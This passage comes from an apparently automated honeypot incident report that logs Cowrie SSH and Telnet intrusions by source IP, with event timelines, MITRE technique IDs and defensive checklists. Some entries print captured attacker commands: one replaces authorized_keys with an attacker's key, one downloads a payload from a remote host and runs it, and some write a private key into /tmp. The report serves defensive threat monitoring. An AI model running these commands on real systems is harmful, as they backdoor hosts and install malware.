| `2026-08-21 18:30:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15a587156120

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 18:31 |
| **Last Seen** | 2026-08-21 18:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:31:00` | `cowrie.session.connect` |
| `2026-08-21 18:31:00` | `cowrie.client.version` |
| `2026-08-21 18:31:00` | `cowrie.client.kex` |
| `2026-08-21 18:31:01` | `cowrie.login.success` |
| `2026-08-21 18:31:01` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:31:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 18:31:02` | `cowrie.direct-tcpip.data` |
| `2026-08-21 18:31:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-505081d6309c

| Field | Detail |
|---|---|
| **Source IP** | `220.246.42[.]217` |
| **First Seen** | 2026-08-21 18:32 |
| **Last Seen** | 2026-08-21 18:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:32:16` | `cowrie.session.connect` |
| `2026-08-21 18:32:17` | `cowrie.client.version` |
| `2026-08-21 18:32:17` | `cowrie.client.kex` |
| `2026-08-21 18:32:19` | `cowrie.login.success` |
| `2026-08-21 18:32:20` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.42[.]217` to AbuseIPDB if not already reported
- [ ] Block `220.246.42[.]217` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-039109d8717a

| Field | Detail |
|---|---|
| **Source IP** | `93.171.184[.]57` |
| **First Seen** | 2026-08-21 18:32 |
| **Last Seen** | 2026-08-21 18:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:32:26` | `cowrie.session.connect` |
| `2026-08-21 18:32:27` | `cowrie.client.version` |
| `2026-08-21 18:32:27` | `cowrie.client.kex` |
| `2026-08-21 18:32:29` | `cowrie.login.success` |
| `2026-08-21 18:32:30` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:32:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.171.184[.]57` to AbuseIPDB if not already reported
- [ ] Block `93.171.184[.]57` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95555cbdb940

| Field | Detail |
|---|---|
| **Source IP** | `203.170.192[.]251` |
| **First Seen** | 2026-08-21 18:35 |
| **Last Seen** | 2026-08-21 18:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:35:34` | `cowrie.session.connect` |
| `2026-08-21 18:35:34` | `cowrie.client.version` |
| `2026-08-21 18:35:34` | `cowrie.client.kex` |
| `2026-08-21 18:35:36` | `cowrie.login.success` |
| `2026-08-21 18:35:37` | `cowrie.session.params` |
| `2026-08-21 18:35:37` | `cowrie.command.input` |
| `2026-08-21 18:35:37` | `cowrie.command.failed` |
| `2026-08-21 18:35:37` | `cowrie.log.closed` |
| `2026-08-21 18:35:38` | `cowrie.session.params` |
| `2026-08-21 18:35:38` | `cowrie.command.input` |
| `2026-08-21 18:35:38` | `cowrie.session.file_download` |
| `2026-08-21 18:35:38` | `cowrie.log.closed` |
| `2026-08-21 18:35:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.170.192[.]251` to AbuseIPDB if not already reported
- [ ] Block `203.170.192[.]251` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aab09f8a3fad

| Field | Detail |
|---|---|
| **Source IP** | `203.170.192[.]251` |
| **First Seen** | 2026-08-21 18:35 |
| **Last Seen** | 2026-08-21 18:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:35:39` | `cowrie.session.connect` |
| `2026-08-21 18:35:39` | `cowrie.client.version` |
| `2026-08-21 18:35:39` | `cowrie.client.kex` |
| `2026-08-21 18:35:40` | `cowrie.login.success` |
| `2026-08-21 18:35:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.170.192[.]251` to AbuseIPDB if not already reported
- [ ] Block `203.170.192[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62ebfdc8fea2

| Field | Detail |
|---|---|
| **Source IP** | `203.170.192[.]251` |
| **First Seen** | 2026-08-21 18:35 |
| **Last Seen** | 2026-08-21 18:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:35:40` | `cowrie.session.connect` |
| `2026-08-21 18:35:40` | `cowrie.client.version` |
| `2026-08-21 18:35:41` | `cowrie.client.kex` |
| `2026-08-21 18:35:42` | `cowrie.login.success` |
| `2026-08-21 18:35:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.170.192[.]251` to AbuseIPDB if not already reported
- [ ] Block `203.170.192[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c934abe7a5d0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]26` |
| **First Seen** | 2026-08-21 18:38 |
| **Last Seen** | 2026-08-21 18:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `(cd /tmp; wget hxxp://5.182.210[.]174/ok; curl -O hxxp://5.182.210[.]174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &, cd /tmp, wget hxxp://5.182.210[.]174/ok, curl -O hxxp://5.182.210[.]174/ok, chmod +x ok` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:38:46` | `cowrie.session.connect` |
| `2026-08-21 18:38:46` | `cowrie.telnet.option` |
| `2026-08-21 18:38:46` | `cowrie.login.success` |
| `2026-08-21 18:38:47` | `cowrie.session.params` |
| `2026-08-21 18:38:47` | `cowrie.telnet.option` |
| `2026-08-21 18:38:47` | `cowrie.telnet.option` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.failed` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.success` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.failed` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.success` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.failed` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.success` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.command.failed` |
| `2026-08-21 18:38:47` | `cowrie.command.input` |
| `2026-08-21 18:38:47` | `cowrie.log.closed` |
| `2026-08-21 18:38:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23e9a6fcd230

| Field | Detail |
|---|---|
| **Source IP** | `47.85.8[.]171` |
| **First Seen** | 2026-08-21 18:39 |
| **Last Seen** | 2026-08-21 18:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:39:06` | `cowrie.session.connect` |
| `2026-08-21 18:39:06` | `cowrie.client.version` |
| `2026-08-21 18:39:06` | `cowrie.client.kex` |
| `2026-08-21 18:39:06` | `cowrie.login.success` |
| `2026-08-21 18:39:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.85.8[.]171` to AbuseIPDB if not already reported
- [ ] Block `47.85.8[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fde72ee384ff

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-21 18:39 |
| **Last Seen** | 2026-08-21 18:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:39:06` | `cowrie.session.connect` |
| `2026-08-21 18:39:06` | `cowrie.client.version` |
| `2026-08-21 18:39:06` | `cowrie.client.kex` |
| `2026-08-21 18:39:07` | `cowrie.login.success` |
| `2026-08-21 18:39:08` | `cowrie.session.params` |
| `2026-08-21 18:39:08` | `cowrie.command.input` |
| `2026-08-21 18:39:08` | `cowrie.session.file_download` |
| `2026-08-21 18:39:08` | `cowrie.session.file_download` |
| `2026-08-21 18:39:08` | `cowrie.log.closed` |
| `2026-08-21 18:39:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-871f7933f3d2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 18:40 |
| **Last Seen** | 2026-08-21 18:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:40:44` | `cowrie.session.connect` |
| `2026-08-21 18:40:44` | `cowrie.client.version` |
| `2026-08-21 18:40:44` | `cowrie.client.kex` |
| `2026-08-21 18:40:45` | `cowrie.login.success` |
| `2026-08-21 18:40:45` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:40:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 18:40:46` | `cowrie.direct-tcpip.data` |
| `2026-08-21 18:40:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65c921f46f64

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 18:40 |
| **Last Seen** | 2026-08-21 18:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:40:48` | `cowrie.session.connect` |
| `2026-08-21 18:40:48` | `cowrie.client.version` |
| `2026-08-21 18:40:48` | `cowrie.client.kex` |
| `2026-08-21 18:40:49` | `cowrie.login.success` |
| `2026-08-21 18:40:49` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:40:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 18:40:49` | `cowrie.direct-tcpip.data` |
| `2026-08-21 18:40:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-604a1ae0ae56

| Field | Detail |
|---|---|
| **Source IP** | `101.36.104[.]242` |
| **First Seen** | 2026-08-21 18:42 |
| **Last Seen** | 2026-08-21 18:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:42:56` | `cowrie.session.connect` |
| `2026-08-21 18:42:57` | `cowrie.client.version` |
| `2026-08-21 18:42:57` | `cowrie.client.kex` |
| `2026-08-21 18:42:59` | `cowrie.login.success` |
| `2026-08-21 18:42:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.104[.]242` to AbuseIPDB if not already reported
- [ ] Block `101.36.104[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-941c927e9d39

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-21 18:42 |
| **Last Seen** | 2026-08-21 18:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:42:59` | `cowrie.session.connect` |
| `2026-08-21 18:42:59` | `cowrie.client.version` |
| `2026-08-21 18:42:59` | `cowrie.client.kex` |
| `2026-08-21 18:43:00` | `cowrie.login.success` |
| `2026-08-21 18:43:01` | `cowrie.session.params` |
| `2026-08-21 18:43:01` | `cowrie.command.input` |
| `2026-08-21 18:43:01` | `cowrie.session.file_download` |
| `2026-08-21 18:43:01` | `cowrie.session.file_download` |
| `2026-08-21 18:43:01` | `cowrie.log.closed` |
| `2026-08-21 18:43:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-593d8151f77b

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-21 18:44 |
| **Last Seen** | 2026-08-21 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:44:12` | `cowrie.session.connect` |
| `2026-08-21 18:44:12` | `cowrie.client.version` |
| `2026-08-21 18:44:12` | `cowrie.client.kex` |
| `2026-08-21 18:44:13` | `cowrie.login.success` |
| `2026-08-21 18:44:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd94e45a03fb

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-21 18:44 |
| **Last Seen** | 2026-08-21 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:44:12` | `cowrie.session.connect` |
| `2026-08-21 18:44:12` | `cowrie.client.version` |
| `2026-08-21 18:44:12` | `cowrie.client.kex` |
| `2026-08-21 18:44:13` | `cowrie.login.success` |
| `2026-08-21 18:44:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b406c45225d1

| Field | Detail |
|---|---|
| **Source IP** | `193.8.186[.]29` |
| **First Seen** | 2026-08-21 18:47 |
| **Last Seen** | 2026-08-21 18:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0[.]0 Safari/537.36, Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7, Accept-Encoding: gzip, deflate, br, Accept-Language: en-US,en;q=0.9, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:47:12` | `cowrie.session.connect` |
| `2026-08-21 18:47:12` | `cowrie.login.success` |
| `2026-08-21 18:47:13` | `cowrie.session.params` |
| `2026-08-21 18:47:13` | `cowrie.command.input` |
| `2026-08-21 18:47:13` | `cowrie.command.input` |
| `2026-08-21 18:47:13` | `cowrie.command.failed` |
| `2026-08-21 18:47:13` | `cowrie.command.input` |
| `2026-08-21 18:47:13` | `cowrie.command.failed` |
| `2026-08-21 18:47:13` | `cowrie.command.input` |
| `2026-08-21 18:47:13` | `cowrie.command.failed` |
| `2026-08-21 18:47:13` | `cowrie.command.input` |
| `2026-08-21 18:47:13` | `cowrie.command.failed` |
| `2026-08-21 18:47:13` | `cowrie.command.input` |
| `2026-08-21 18:47:13` | `cowrie.log.closed` |
| `2026-08-21 18:47:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.8.186[.]29` to AbuseIPDB if not already reported
- [ ] Block `193.8.186[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ac30765ece0

| Field | Detail |
|---|---|
| **Source IP** | `60.172.41[.]103` |
| **First Seen** | 2026-08-21 18:48 |
| **Last Seen** | 2026-08-21 18:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:48:02` | `cowrie.session.connect` |
| `2026-08-21 18:48:03` | `cowrie.client.version` |
| `2026-08-21 18:48:03` | `cowrie.client.kex` |
| `2026-08-21 18:48:05` | `cowrie.login.success` |
| `2026-08-21 18:48:05` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:48:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.172.41[.]103` to AbuseIPDB if not already reported
- [ ] Block `60.172.41[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0851cec6309e

| Field | Detail |
|---|---|
| **Source IP** | `113.140.95[.]250` |
| **First Seen** | 2026-08-21 18:48 |
| **Last Seen** | 2026-08-21 18:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:48:11` | `cowrie.session.connect` |
| `2026-08-21 18:48:11` | `cowrie.client.version` |
| `2026-08-21 18:48:11` | `cowrie.client.kex` |
| `2026-08-21 18:48:14` | `cowrie.login.success` |
| `2026-08-21 18:48:14` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.140.95[.]250` to AbuseIPDB if not already reported
- [ ] Block `113.140.95[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ede92431785a

| Field | Detail |
|---|---|
| **Source IP** | `202.72.196[.]75` |
| **First Seen** | 2026-08-21 18:48 |
| **Last Seen** | 2026-08-21 18:53 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:48:36` | `cowrie.session.connect` |
| `2026-08-21 18:48:36` | `cowrie.client.version` |
| `2026-08-21 18:48:36` | `cowrie.client.kex` |
| `2026-08-21 18:48:39` | `cowrie.login.success` |
| `2026-08-21 18:48:39` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.72.196[.]75` to AbuseIPDB if not already reported
- [ ] Block `202.72.196[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-290675286dee

| Field | Detail |
|---|---|
| **Source IP** | `131.255.68[.]201` |
| **First Seen** | 2026-08-21 18:48 |
| **Last Seen** | 2026-08-21 18:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:48:49` | `cowrie.session.connect` |
| `2026-08-21 18:48:50` | `cowrie.client.version` |
| `2026-08-21 18:48:50` | `cowrie.client.kex` |
| `2026-08-21 18:48:52` | `cowrie.login.success` |
| `2026-08-21 18:48:52` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:48:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.255.68[.]201` to AbuseIPDB if not already reported
- [ ] Block `131.255.68[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72851d2fc39b

| Field | Detail |
|---|---|
| **Source IP** | `47.253.5[.]130` |
| **First Seen** | 2026-08-21 18:49 |
| **Last Seen** | 2026-08-21 18:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

